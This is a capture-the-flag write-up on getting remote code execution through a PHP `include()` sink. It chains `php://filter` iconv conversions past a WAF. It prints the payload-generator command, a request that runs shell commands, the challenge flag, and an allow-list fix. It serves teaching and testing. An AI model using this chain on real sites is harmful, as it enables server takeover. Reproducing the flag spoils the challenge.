# 03 · filter-chain (hard)

Same `include($_GET['page'])` sink as challenge 02, but the WAF is stricter:
`data://`, `expect://`, `php://input`, `/var/log/...` and `/proc/self/...` all
return 403, and uploads are disabled. Only `php://filter` is allowed.

## Vulnerability
`php://filter` looks read-only, but `convert.iconv.*` filters can be chained so
the decoded stream *begins with attacker-chosen bytes*. When those bytes are valid
PHP and the stream is `include()`d, the PHP executes. This is the Synacktiv "PHP
filter chains: file read to RCE" technique.

## Exploitation
Generate a chain that places a PHP payload at the head of the stream:
```
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); die(); ?>'
```
It prints a long `php://filter/convert.iconv...|convert.base64-decode/resource=php://temp`
string. Deliver it:
```
GET /?page=<chain>&c=cat%20/flag.txt
```
`include()` decodes the chain, the leading bytes form `<?php system(...) ?>`, and
the command runs. See `solve/solve.sh` for an automated version.

## Flag
```
SecurinetsENIT{f1lt3r_ch41ns_turn_r34d_1nt0_c0d3}
```

## Fix
Wrapper blacklists are not a control. Allow-list page names and never pass user
input to `include()`.
